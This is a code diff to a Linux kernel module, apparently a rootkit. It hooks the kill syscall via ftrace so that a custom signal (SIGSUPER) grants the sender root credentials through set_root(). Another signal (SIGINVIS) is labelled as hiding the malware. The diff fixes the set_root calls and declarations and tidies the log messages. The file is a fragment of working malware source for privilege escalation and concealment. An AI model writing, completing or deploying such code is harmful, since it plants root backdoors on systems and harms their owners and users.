@@ -8,7 +8,7 @@
 #include <linux/version.h>          // linux kernel versions 
 #include <linux/dirent.h>	        //contains dirent structs etc
 
-#include "ftrace_helper.h"          //helps 
+#include "ftrace_helper.h"          //helps with setting the hooked functions bach to default
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("infernexio");
@@ -46,10 +46,11 @@ enum signals{
 #if PTREGS_SYSCALL_STUB
 static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
-    
+    void set_root(void);
+
     if(sig == SIGSUPER){
-        printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
-        set_root(void);
+        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root privilges", sig, SIGSUPER);
+        set_root();
         return 0;
     }else if(sig == SIGINVIS){
         printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
@@ -78,12 +79,14 @@ static asmlinkage int hook_mkdir(const struct pt_regs *regs){
 
 #else
 static asmlinkage long hook_kill(pid_t pid, int sig){
+	void set_root(void);
+    
     if(sig == SIGSUPER){
-        printk(KERN_INFO "signal: %d == SIGSUPER :d | giving root", sig, SIGSUPER);
-        set_root(void);
+        printk(KERN_INFO "signal: %d == SIGSUPER %d | giving root priveliges", sig, SIGSUPER);
+        set_root();
         return 0;
     }else if(sig == SIGINVIS){
-        printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
+        printk(KERN_INFO "signal: %d == SIGINVIS %d | hide itself/malware/etc", sig, SIGINVIS);
         return 0;
     }
     
@@ -146,7 +149,7 @@ static asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
 //     return 0;
 // }
 
-static void set_root(void){
+void set_root(void){
     struct cred *root;
     root = prepare_creds();
 
